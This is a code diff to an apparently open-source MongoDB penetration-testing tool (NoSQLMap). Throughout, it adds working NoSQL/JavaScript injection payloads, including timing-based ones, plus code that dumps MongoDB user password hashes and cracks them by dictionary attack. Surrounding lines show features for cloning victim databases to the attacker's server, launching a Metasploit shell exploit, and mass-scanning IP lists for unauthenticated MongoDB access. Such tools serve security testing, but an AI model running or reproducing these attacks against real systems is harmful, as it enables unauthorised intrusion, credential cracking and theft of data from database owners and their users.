@@ -25,6 +25,7 @@ import pymongo
 import subprocess
 import json
 import gridfs
+from hashlib import md5
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
@@ -242,6 +243,8 @@ def options():
 			mainMenu()
 			
 def netAttacks(target):
+	print "DB Access attacks"
+	print "================="
 	mgtOpen = False
 	webOpen = False
 	#This is a global for future use with other modules; may change
@@ -306,8 +309,8 @@ def netAttacks(target):
 		
 		print "MongoDB web management closed or requires authentication."	
 		
+	print "\n"
 	if mgtOpen == True:
-		#Ths is compiling server info?????
 		print "Server Info:"
 		mongoVer = conn.server_info()['version']
 		print "MongoDB Version: " + mongoVer
@@ -335,13 +338,21 @@ def netAttacks(target):
 				colls = db.collection_names()
 				print dbItem + ":"
 				print "\n".join(colls)
+				print "\n"
+				
 				if 'system.users' in colls:
 					users = list(db.system.users.find())
 					print "Database Users and Password Hashes:"
-					#print dbItem
-					print str(users)
-			#print "\n"
-		
+					
+					for x in range (0,len(users)):
+						print "Username: " + users[x]['user']
+						print "Hash: " + users[x]['pwd']
+						print "\n"
+						crack = raw_input("Crack this hash? ")
+						
+						if crack == "y":
+							brute_pass(users[x]['user'],users[x]['pwd'])
+					
 		except:
 			print "Error:  Couldn't list collections.  The provided credentials may not have rights."
 		
@@ -368,7 +379,7 @@ def netAttacks(target):
 		if stealDB == "y" or stealDB == "Y":
 			stealDBs (myIP)
 			
-		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)?")
+		getShell = raw_input("Try to get a shell? (Requrires mongoDB <2.2.4)? ")
 		
 		if getShell == "y" or getShell == "Y":
 			#Launch Metasploit exploit
@@ -383,10 +394,14 @@ def netAttacks(target):
 	
 	
 def webApps():
+	print "Web App Attacks"
+	print "==============="
 	paramName = []
 	paramValue = []
 	vulnAddrs = []
 	possAddrs = []
+	timeVulnsStr = []
+	timeVulnsInt = []
 	appUp = False
 	strTbAttack = False
 	intTbAttack = False
@@ -714,7 +729,7 @@ def buildUri(origUri, randValue):
 	paramName = []
 	paramValue = []
 	global uriArray
-	uriArray = ["","","","","","","","","",""]
+	uriArray = ["","","","","","","","","","","","","",""]
 	injOpt = ""
 	
 	#Split the string between the path and parameters, and then split each parameter
@@ -747,8 +762,8 @@ def buildUri(origUri, randValue):
 		raw_input("Something went wrong.  Press enter to return to the main menu...")
 		mainMenu()
 	
-	print "debug:"
-	print split_uri[0]
+	#print "debug:"
+	#print split_uri[0]
 	
 	x = 0
 	uriArray[0] = split_uri[0] + "?"
@@ -761,8 +776,10 @@ def buildUri(origUri, randValue):
 	uriArray[7] = split_uri[0] + "?"
 	uriArray[8] = split_uri[0] + "?"
 	uriArray[9] = split_uri[0] + "?"
-	
-	
+	uriArray[10] = split_uri[0] + "?"
+	uriArray[11] = split_uri[0] + "?"
+	uriArray[12] = split_uri[0] + "?"
+	uriArray[13] = split_uri[0] + "?"
 	
 	for item in paramName:		
 		if paramName[x] == injOpt:
@@ -776,6 +793,11 @@ def buildUri(origUri, randValue):
 			uriArray[7] += paramName[x] + "=1; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=1" + "&"
 			uriArray[8] += paramName[x] + "=a'; return this.a != '" + randValue + "'; var dummy='!" + "&"
 			uriArray[9] += paramName[x] + "=1; return this.a !=" + randValue + "; var dummy=1" + "&"
+			uriArray[10] += paramName[x] + "=a\"; return db.a.find(); var dummy=\"!" + "&"
+			uriArray[11] += paramName[x] + "=a\"; return this.a != '" + randValue + "'; var dummy=\"!" + "&"
+			uriArray[12] += paramName[x] + "=a\"; return db.a.findOne(); var dummy=\"!" + "&"
+			uriArray[13] += paramName[x] + "=a\"; var date = new Date(); var curDate = null; do { curDate = new Date(); } while((Math.abs(date.getTime()-curDate.getTime()))/1000 < 10); return; var dummy=\"!" + "&"
+			
 
 		else:
 			uriArray[0] += paramName[x] + "=" + paramValue[x] + "&"
@@ -788,6 +810,11 @@ def buildUri(origUri, randValue):
 			uriArray[7] += paramName[x] + "=" + paramValue[x] + "&"
 			uriArray[8] += paramName[x] + "=" + paramValue[x] + "&"
 			uriArray[9] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[10] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[11] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[12] += paramName[x] + "=" + paramValue[x] + "&"
+			uriArray[13] += paramName[x] + "=" + paramValue[x] + "&"
+			
 		x += 1
 		
 	#Clip the extra & off the end of the URL
@@ -801,7 +828,10 @@ def buildUri(origUri, randValue):
 	uriArray[7] = uriArray[7][:-1]
 	uriArray[8] = uriArray[8][:-1]
 	uriArray[9] = uriArray[9][:-1]
-	
+	uriArray[10] = uriArray[10][:-1]
+	uriArray[11] = uriArray[11][:-1]
+	uriArray[12] = uriArray[12][:-1]
+	uriArray[13] = uriArray[13][:-1]
 	return uriArray[0]
 
 def stealDBs(myDB):
@@ -835,7 +865,7 @@ def stealDBs(myDB):
 			raw_input("Invalid Selection.  Press enter to continue.")
 			stealDBs(myDB)
 			
-		cloneAnother = raw_input("Database cloned.  Copy another?")
+		cloneAnother = raw_input("Database cloned.  Copy another? ")
 		
 		if cloneAnother == "y" or cloneAnother == "Y":
 			stealDBs(myDB)
@@ -851,38 +881,38 @@ def massMongo():
 	global victim
 	success = []
 	print "\n"
-	print "Massmongo-Scan for default access to MongoDB servers"
-	print "===================================================="
+	print "MongoDB Default Access Scanner"
+	print "=============================="
 	loadPath = raw_input("Enter file name with IP list to scan: ")
 
 	with open (loadPath) as f:
 	        ipList = f.readlines()
 
-
+	print "\n"
 	for target in ipList:
 	        try:
 	                conn = pymongo.MongoClient(target,27017)
-			print " Connected to " + target[:-1]
+			print "Connected to " + target[:-1] + "!"
 			dbList = conn.database_names()
 			
-			print "Successful admin access to " + target[:-1]
+			print "Successful admin access on " + target[:-1] + ".\n"
 			target = target[:-1]
 			success.append(target)
 			conn.disconnect()
 
 		except:
-		        print "Failed to connect to " + target + " or credentials required."
+		        print "Failed to connect to " + target[:-1] + " or credentials required."
 
 	print "\n\n"
 	print "Discovered MongoDB Servers:"
 	
 	menuItem = 1
-	print "List of servers:"
 	for server in success:
 		print str(menuItem) + "-" + server
 		menuItem += 1
 	
 	select = True
+	print "\n"
 	while select:
 		select = raw_input("Select a NoSQLMap target or press x to exit: ")
 	
@@ -898,4 +928,28 @@ def massMongo():
 		else:
 			raw_input("Invalid selection.")				
 	
+def gen_pass(user, passw):
+	return md5(user + ":mongo:" + str(passw)).hexdigest();
+
+
+def brute_pass(user,key):
+	dictionary = raw_input("Enter path to password dictionary: ")
+	#print user
+	#print key
+	print "Preparing dictionary attack..."
+	with open (dictionary) as f:
+	        passList = f.readlines()
+		
+	print "debug: " + str(passList)
+
+	for passGuess in passList:
+		temp = passGuess.split("\n")[0]
+		#print "debug: " + temp
+		if gen_pass(user, temp) == key:
+			print "\nFound - "+user+":"+passGuess
+			return passGuess
+			
+	print "Password not found for "+user
+	return ""
+
 mainMenu()
